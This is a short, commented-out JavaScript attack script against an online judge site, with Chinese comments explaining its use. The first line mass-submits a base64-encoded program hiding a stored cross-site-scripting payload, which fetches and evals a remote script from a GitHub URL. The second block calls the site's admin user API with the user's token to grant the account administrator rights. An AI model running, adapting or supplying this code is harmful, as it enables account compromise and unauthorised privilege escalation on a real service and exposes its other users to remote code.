// for(var v=0;v<3;v++){fetch('https://oj.cpl.icu/api/v2/submission',{'headers':{'authorization':'Bearer '+JSON.parse(localStorage.getItem('dotoj-auth')).token,'content-type':'application/json',},'body':'{"problemId":'+Math.floor(Math.random()*170).toString()+',"program":{"language":2,"code":"aW50IG1haW4oKXtjb25zdCBjaGFyKmNoPVIiKDxpbWcgc3JjIG9uZXJyb3I9InNldFRpbWVvdXQoYXN5bmMgZnVuY3Rpb24oKXtldmFsKGF3YWl0KGF3YWl0IGZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYXg2bi9tYWxpanVkZ2UvcmVmcy9oZWFkcy9tYWluL2hhY2suanMnKSkudGV4dCgpKX0sMTAwMCk7Ij4pIjtjaGFyIHk9Y2hbMF07eT1jaFsxXTtFUlJ9"}}','method':'POST'});}

// ffffffff-ffff-ffff-ffff-ffffffffffff 是你的 localStorage 的 id
// Contestant_ID 是一个暂时没啥用的东西，一般和用户名相同
// Contestant_Name 是排行榜上显示的名字
// isAdministrator 让你自己变成 Admin，剩下三个不用管

/*
fetch("https://oj.cpl.icu/api/v2/admin/user/ffffffff-ffff-ffff-ffff-ffffffffffff", {
  "headers": {
    "authorization": "Bearer "+JSON.parse(localStorage.getItem('dotoj-auth')).token,
    "content-type": "application/json",
  },
  "body": "{\"password\":null,\"contestantId\":\"Contestant_ID\",\"contestantName\":\"Contestant_Name\",\"isAdministrator\":true,\"isUserManager\":false,\"isContestManager\":false,\"isSubmissionManager\":false}",
  "method": "PUT"
});
*/
